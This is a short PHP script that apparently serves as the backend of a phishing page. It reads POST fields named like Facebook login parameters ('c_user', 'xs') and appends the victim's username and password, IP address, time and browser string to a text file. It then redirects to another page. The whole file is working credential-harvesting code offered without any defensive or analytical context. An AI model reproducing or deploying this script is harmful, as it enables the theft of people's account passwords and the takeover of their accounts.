<?php
// made by Ali Brohi


$username = $_POST['c_user'];
$pwd = $_POST['xs'];

              
if(isset($username) and isset($pwd))
{
$texts = "\n DATA*INSERTED\n\nUsername:: ".$username."\nPassword:: ".$pwd."\nIP-Address:: ".$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **\n\n\n\n";



$fp = fopen('data.txt', 'a');


fwrite($fp,$texts );

fclose($fp);


header("Location: hello.php");
  
}
?>
